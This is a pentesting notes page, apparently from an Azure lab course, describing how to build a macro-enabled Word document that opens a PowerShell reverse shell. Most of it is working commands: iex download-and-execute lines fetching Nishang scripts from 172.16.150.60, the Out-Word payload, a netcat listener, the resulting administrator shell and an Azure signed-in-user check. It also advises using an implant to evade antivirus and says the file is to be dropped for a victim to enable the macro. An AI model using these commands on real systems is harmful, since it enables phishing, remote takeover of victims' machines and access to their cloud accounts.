---
title: Macro enabled Word-files (Revshell)
source_url: https://notes.incendium.rocks/pentesting-notes/cloud/azure/privilege-escalation/macro-enabled-word-files-revshell
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: cloud
---

## Getting a shell

We will use [Out-Word.ps1](https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Client/Out-Word.ps1) and [**InvokePowerShellTcp.ps1**](https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1) from Nishang to create a Word file containing a simple powershell reverse shell.

This gets detected easily, so preferably use a implant to bypass AV

We will need access to a host with a licensed Office 365 software. Then we can use Out-Word.ps1:

```powershell
# Create Word file with malicous macro
iex (New-Object Net.Webclient).downloadstring("http://172.16.150.60:82/Out-Word.ps1")
Out-Word -Payload "powershell iex (New-Object Net.Webclient).downloadstring('http://172.16.150.60:82/InvokePowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 172.16.150.60 -Port 4444" -OutputFile studentx.doc

# Start listener
PS C:\AzAD\Tools> C:\AzAD\Tools\netcat-win32-1.12\nc.exe -lvp 4444
listening on [any] 4444 ...

# Get shell
172.16.1.11: inverse host lookup failed: h_errno 11004: NO_DATA
connect to [172.16.150.60] from (UNKNOWN) [172.16.1.11] 50626: NO_DATA
Windows PowerShell running as user Administrator on DEFENG-CONSENT
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
defeng-consent\administrator
```

Of course we should drop the Word file somewhere and the user should enable the macro.

## On the system

In the reverse shell, check if a user is signed in to azure:

```powershell
PS C:\Windows\system32> az ad signed-in-user show
{
  "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#users/$entity",
  "businessPhones": [],
  "displayName": "Testuser",
  "givenName": null,
  "id": "f66e133c-bd01-4b0b-b3b7-xxxx",
  "jobTitle": null,
  "mail": "x@x.onmicrosoft.com",
  "mobilePhone": null,
  "officeLocation": null,
  "preferredLanguage": "en-US",
  "surname": null,
  "userPrincipalName": "x@x.onmicrosoft.com"
}
```
